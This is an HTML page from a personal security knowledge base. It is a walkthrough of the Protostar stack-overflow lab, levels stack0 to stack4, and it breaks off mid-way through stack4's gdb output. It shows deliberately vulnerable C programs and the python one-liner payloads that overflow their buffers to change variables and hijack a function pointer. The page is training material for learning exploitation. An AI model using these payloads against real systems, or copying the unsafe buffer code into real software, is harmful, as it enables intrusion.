


<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Wissenverzeichnis zu diversen Dingen der Computerei">
      
      
      
        <meta name="author" content="Felix KÃ¶rner">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-5.3.3">
    
    
      
        <title>Protostar - KnowledgeBase</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.fe0cca5b.min.css">
      
        <link rel="stylesheet" href="../assets/stylesheets/palette.a46bcfb3.min.css">
      
      
        
        
        <meta name="theme-color" content="#2196f3">
      
    
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
    
      
    
    
  </head>
  
  
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="blue" data-md-color-accent="cyan">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#protostart" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href=".." title="KnowledgeBase" class="md-header-nav__button md-logo" aria-label="KnowledgeBase">
      
  <img src="../images/logo2.png" alt="logo">

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      
        <div class="md-header-nav__ellipsis">
          <span class="md-header-nav__topic md-ellipsis">
            KnowledgeBase
          </span>
          <span class="md-header-nav__topic md-ellipsis">
            
              Protostar
            
          </span>
        </div>
      
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
        
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="KnowledgeBase" class="md-nav__button md-logo" aria-label="KnowledgeBase">
      
  <img src="../images/logo2.png" alt="logo">

    </a>
    KnowledgeBase
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      IT Security
      <span class="md-nav__icon md-icon">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
      </span>
    </label>
    <nav class="md-nav" aria-label="IT Security" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        <span class="md-nav__icon md-icon">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
        </span>
        IT Security
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../hacking/" title="Hacking the art of exploitation" class="md-nav__link">
      Hacking the art of exploitation
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Protostar
        <span class="md-nav__icon md-icon">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
        </span>
      </label>
    
    <a href="./" title="Protostar" class="md-nav__link md-nav__link--active">
      Protostar
    </a>
    
      
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#stack0" class="md-nav__link">
    stack0
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack1" class="md-nav__link">
    stack1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack2" class="md-nav__link">
    stack2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack3" class="md-nav__link">
    stack3
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack4" class="md-nav__link">
    stack4
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack5" class="md-nav__link">
    stack5
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scratch-notes" class="md-nav__link">
    Scratch Notes
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python-foo" class="md-nav__link">
    Python Foo
  </a>
  
</li>
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../oscp/" title="OSCP" class="md-nav__link">
      OSCP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Linux
      <span class="md-nav__icon md-icon">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
      </span>
    </label>
    <nav class="md-nav" aria-label="Linux" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        <span class="md-nav__icon md-icon">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
        </span>
        Linux
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../p2p_network/" title="P2P Network" class="md-nav__link">
      P2P Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../raid/" title="RAID Debian" class="md-nav__link">
      RAID Debian
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Test
      <span class="md-nav__icon md-icon">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
      </span>
    </label>
    <nav class="md-nav" aria-label="Test" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        <span class="md-nav__icon md-icon">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
        </span>
        Test
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../jd/" title="JDownloader 2.0" class="md-nav__link">
      JDownloader 2.0
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#stack0" class="md-nav__link">
    stack0
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack1" class="md-nav__link">
    stack1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack2" class="md-nav__link">
    stack2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack3" class="md-nav__link">
    stack3
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack4" class="md-nav__link">
    stack4
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack5" class="md-nav__link">
    stack5
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scratch-notes" class="md-nav__link">
    Scratch Notes
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python-foo" class="md-nav__link">
    Python Foo
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  
                
                
                <h1 id="protostart">Protostart<a class="headerlink" href="#protostart" title="Permanent link">&para;</a></h1>
<ul>
<li><a href="https://web.archive.org/web/20170318192755/https://exploit-exercises.com/protostar/">Protostar Website</a></li>
<li><a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/">Offset Pattern</a></li>
</ul>
<h2 id="stack0">stack0<a class="headerlink" href="#stack0" title="Permanent link">&para;</a></h2>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have changed the &#39;modified&#39; variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</td></tr></table>

<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
This level is at /opt/protostar/bin/stack0</p>
</div>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">user@protostar:/opt/protostar/bin$ python -c &#39;print(&quot;A&quot;*65)&#39; | ./stack0</span>
<span class="err">you have changed the &#39;modified&#39; variable</span>
</code></pre></div>
</td></tr></table>

<div class="admonition note">
<p class="admonition-title">Note</p>
<ul>
<li>buffersize 64 bytes</li>
</ul>
</div>
<h2 id="stack1">stack1<a class="headerlink" href="#stack1" title="Permanent link">&para;</a></h2>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;please specify an argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x61626364</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</td></tr></table>

<blockquote>
<p>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory. 
This level is at /opt/protostar/bin/stack1</p>
</blockquote>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<ul>
<li>If you are unfamiliar with the hexadecimal being displayed, âman asciiâ is your friend.</li>
<li>Protostar is little endian</li>
</ul>
</div>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">user@protostar:/opt/protostar/bin$ ./stack1 $(python -c &#39;print(&quot;A&quot;*64+&quot;\x64\x63\x62\x61&quot;)&#39;)</span>
<span class="err">you have correctly got the variable to the right value</span>
</code></pre></div>
</td></tr></table>

<div class="admonition note">
<p class="admonition-title">Note</p>
<ul>
<li>buffersize 64 bytes</li>
<li>we have to turn mix up bytes because of little endian</li>
</ul>
</div>
<h2 id="stack2">stack2<a class="headerlink" href="#stack2" title="Permanent link">&para;</a></h2>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">variable</span><span class="p">;</span>

  <span class="n">variable</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;GREENIE&quot;</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">variable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x0d0a0d0a</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly modified the variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
  <span class="p">}</span>

<span class="p">}</span>
</code></pre></div>
</td></tr></table>

<blockquote>
<p>Stack2 looks at environment variables, and how they can be set.
This level is at /opt/protostar/bin/stack2</p>
</blockquote>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">user@protostar:/opt/protostar/bin$ declare -x GREENIE=$(python -c &#39;print(&quot;A&quot;*64+&quot;\x0a\x0d\x0a\x0d&quot;)&#39;)</span>
<span class="err">./stack2</span>
</code></pre></div>
</td></tr></table>

<div class="admonition note">
<p class="admonition-title">Note</p>
<ul>
<li><a href="https://phoenixts.com/blog/environment-variables-in-linux/">setting env</a></li>
</ul>
</div>
<h2 id="stack3">stack3<a class="headerlink" href="#stack3" title="Permanent link">&para;</a></h2>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">fp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
      <span class="n">fp</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</td></tr></table>

<blockquote>
<p>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
Hints
* both gdb and objdump is your friend you determining where the win() function lies in memory.
This level is at /opt/protostar/bin/stack3</p>
</blockquote>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="k">user</span><span class="nv">@protostar</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="err">$</span><span class="w"> </span><span class="n">objdump</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">stack3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">win</span><span class="w"></span>
<span class="mi">08048424</span><span class="w"> </span><span class="o">&lt;</span><span class="n">win</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">#here</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">adress</span><span class="w"></span>

<span class="k">user</span><span class="nv">@protostar</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;print(&quot;A&quot;*64+&quot;\x24\x84\x04\x08&quot;)&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">stack3</span><span class="w"></span>
<span class="n">calling</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">pointer</span><span class="p">,</span><span class="w"> </span><span class="n">jumping</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="mh">0x08048424</span><span class="w"></span>
<span class="n">code</span><span class="w"> </span><span class="n">flow</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">changed</span><span class="w"></span>
</code></pre></div>
</td></tr></table>

<h2 id="stack4">stack4<a class="headerlink" href="#stack4" title="Permanent link">&para;</a></h2>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</td></tr></table>

<blockquote>
<p>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
This level is at /opt/protostar/bin/stack4
Hints
* A variety of introductory papers into buffer overflows may help.
* gdb lets you do ârun &lt; inputâ
* EIP is not directly after the end of buffer, compiler padding can also increase the size.</p>
</blockquote>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="k">user</span><span class="nv">@protostar</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="err">$</span><span class="w"> </span><span class="n">objdump</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">stack4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">win</span><span class="w"></span>
<span class="mi">080483</span><span class="n">f4</span><span class="w"> </span><span class="o">&lt;</span><span class="n">win</span><span class="o">&gt;</span><span class="err">:</span><span class="w"></span>

<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="n">f</span><span class="w"></span>
<span class="n">Stack</span><span class="w"> </span><span class="k">level</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">frame</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0xbffffd80</span><span class="err">:</span><span class="w"></span>
<span class="w"> </span><span class="n">eip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x804841d</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">main</span><span class="w"> </span><span class="p">(</span><span class="n">stack4</span><span class="o">/</span><span class="n">stack4</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">16</span><span class="p">);</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="n">eip</span><span class="w"> </span><span class="mh">0xb7eadc76</span><span class="w"></span>
<span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="k">language</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="w"></span>
<span class="w"> </span><span class="n">Arglist</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0xbffffd78</span><span class="p">,</span><span class="w"> </span><span class="nl">args</span><span class="p">:</span><span class="w"> </span><span class="n">argc</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="o">=</span><span class="mh">0xbffffe24</span><span class="w"></span>
